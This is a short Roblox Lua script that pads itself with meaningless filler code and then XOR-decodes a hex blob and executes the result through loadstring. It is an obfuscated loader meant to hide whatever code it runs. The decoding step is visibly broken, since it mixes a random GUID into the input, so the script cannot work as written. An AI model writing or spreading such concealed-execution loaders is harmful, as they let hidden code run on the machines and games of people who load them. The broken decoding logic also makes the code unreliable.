local __a = {1,2,3}; for i,v in pairs(__a) do __a[i] = math.random() end
local function __noop() return true end
local _xXx = 'not_used_variable'
for __i = 1, 10 do local __g = __i * math.random(); end
if false then error('You should not see this') end
pcall(function() local _a = 'garbage' .. tostring(math.random()) end)


local __fake = math.randomseed(tick())
local function confuse(x) return x end
for i = 1, 5 do
  if i % 2 == 0 then
    confuse(i * math.random())
  end
end

local _0xA1 = 'a1491a93bc7cefcc8f559a8f86c5e1d8fff6ed23c46b64a3e46aed5f4c8b748bc4f0ed5de0c366b543504bd708cfd18f998a823713d055bc0f524104186b5e8da014df31db439dcadbfba507050e3fe684644537c7e24e0b60fde3f4e42bbb23bb08bfdbaf0badc639b9523f4ee1a47e966b9c21aa19f960650458b555f30a88859eb4598abb52bc'
local _0xB2 = game:GetService('HttpService')
local function _0xC3(_0xStr,_0xKey)
  local _0xResult = ''
  local _0xIndex = 1
  for _0xI = 1, #_0xStr do
    local _0xByte = string.byte(_0xStr, _0xI)
    _0xResult = _0xResult .. string.char(bit32.bxor(_0xByte, string.byte(_0xKey, _0xIndex)))
    _0xIndex = _0xIndex + 1
    if _0xIndex > #_0xKey then _0xIndex = 1 end
  end
  return _0xResult
end
local _0xDecrypted = _0xC3(_0xB2:UrlEncode(_0xB2:GenerateGUID(false) .. _0xA1), 'UltraSecretKey123!')
local function _0xLoadChunk(chunk) local fn, err = loadstring(chunk) if fn then return fn() else error(err) end end
_0xLoadChunk(_0xDecrypted)
